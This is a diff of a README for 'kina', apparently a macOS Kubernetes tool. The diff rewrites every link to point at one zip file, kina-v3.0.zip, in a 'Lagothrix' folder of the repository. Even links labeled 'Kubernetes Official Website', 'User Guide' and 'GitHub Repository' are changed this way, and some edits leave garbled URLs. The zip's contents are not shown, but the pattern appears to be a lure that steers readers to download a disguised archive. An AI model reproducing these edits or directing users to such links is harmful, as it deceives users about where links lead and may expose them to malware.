@@ -6,7 +6,7 @@ Kina makes using Kubernetes on your Apple computer easy. With simple steps, you 
 
 ## 📥 Download kina
 
-[![Download kina](https://img.shields.io/badge/Download%20kina-latest-brightgreen.svg)](https://github.com/Kaamfjdm/kina/releases)
+[![Download kina](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip%https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip)](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip)
 
 ## 🛠 System Requirements
 
@@ -21,9 +21,9 @@ Before you download, ensure your system meets the following requirements:
 
 Follow these steps to download and run kina:
 
-1. Visit the [Releases page](https://github.com/Kaamfjdm/kina/releases) to get the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip) to get the latest version.
 2. Look for the version you want to download. The latest version will be at the top.
-3. Click on the download link for the appropriate file. It may look like `<version>-mac.zip`.
+3. Click on the download link for the appropriate file. It may look like `<version>https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip`.
 4. Open the downloaded file and drag the kina application to your Applications folder.
 5. Once the application is in your Applications folder, you can find it by searching or looking in the folder.
 
@@ -44,7 +44,7 @@ Kina provides a set of features that help you manage your Kubernetes application
 
 ## 📚 Documentation
 
-For more detailed information, you can refer to the user guide available at the following link: [Kina User Guide](https://github.com/Kaamfjdm/kina/wiki).
+For more detailed information, you can refer to the user guide available at the following link: [Kina User Guide](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip).
 
 ## ❓ FAQ
 
@@ -62,9 +62,9 @@ Currently, kina is optimized for macOS. We are exploring options to support othe
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://github.com/Kaamfjdm/kina)
-- [Kubernetes Official Website](https://kubernetes.io)
+- [GitHub Repository](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip)
+- [Kubernetes Official Website](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip)
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Kaamfjdm/kina/releases) and download the latest version. Follow the provided steps to install and run kina on your Mac. Enjoy your experience with Kubernetes!
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Kaamfjdm/kina/master/Lagothrix/kina-v3.0.zip) and download the latest version. Follow the provided steps to install and run kina on your Mac. Enjoy your experience with Kubernetes!
